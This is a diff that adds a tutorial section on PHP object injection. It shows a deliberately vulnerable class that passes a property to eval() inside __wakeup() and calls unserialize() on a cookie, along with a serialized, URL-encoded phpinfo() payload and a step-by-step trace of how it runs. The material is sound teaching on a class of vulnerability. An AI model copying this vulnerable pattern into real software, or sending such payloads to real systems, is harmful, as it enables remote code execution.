@@ -131,3 +131,51 @@ function __wakeup(){
 ```
 
 This function executes whatever is inside the ```hook``` property within the object that is undergoing deserialization. If we were able to control the input to the object undergoing deserialization, we could effectively acheive RCE.
+
+## PHP Object injection examples
+
+PHP object injection attacks occur when the attacker controls the input to a variable that will be deserialized. Extending the usage of the wakeup function above, we have the following vulnerable examples:
+
+### Example 1: RCE through cookie injection
+
+```php
+class Example
+{
+  private $hook;
+
+  function __wakeup(){
+      if (isset($this->hook)) eval($this->hook);
+  }
+}
+
+........
+
+$user_input = unserialize($_COOKIE['data']);
+```
+
+In the above example, since the input ```data``` cookie is unserialized, an attacker could set the cookie with a serialized string. The string when unserialized will call the wakeup function and the ```hook``` property will get executed. We could inject this property with malicious code and acheive RCE as follows:
+
+```php
+class Example
+{
+    private $hook = "phpinfo();";
+}
+
+print urlencode(serialize(new Example));
+```
+
+The URL encoding is done since we would pass this string through a URL. The generated string looks as follows:
+
+Before URL encoding:
+```O:7:"Example":1:{s:13:"Examplehook";s:10:"phpinfo();";}```
+
+After URL encoding:
+```O%3A7%3A%22Example%22%3A1%3A%7Bs%3A13%3A%22%00Example%00hook%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D```
+
+Passing the string above into the ```data``` cookie, the ```phpinfo();``` function will be executed. The flow of the program looks as follows:
+
+1. A serialized ```Example``` object is passed into the program as the ```data``` cookie
+2. The program calls ```unserialize()``` on the ```data``` cookie
+3. Because the ```data``` cookie is a serialized ```Example``` object, ```unserialize()``` instantiates a new ```Example``` object
+4. The magic method ```__wakeup()``` is available so at this point, it is called
+5. The ```$hook``` property of the object is checked for and if it is not NULL, it is executed through ```eval()```
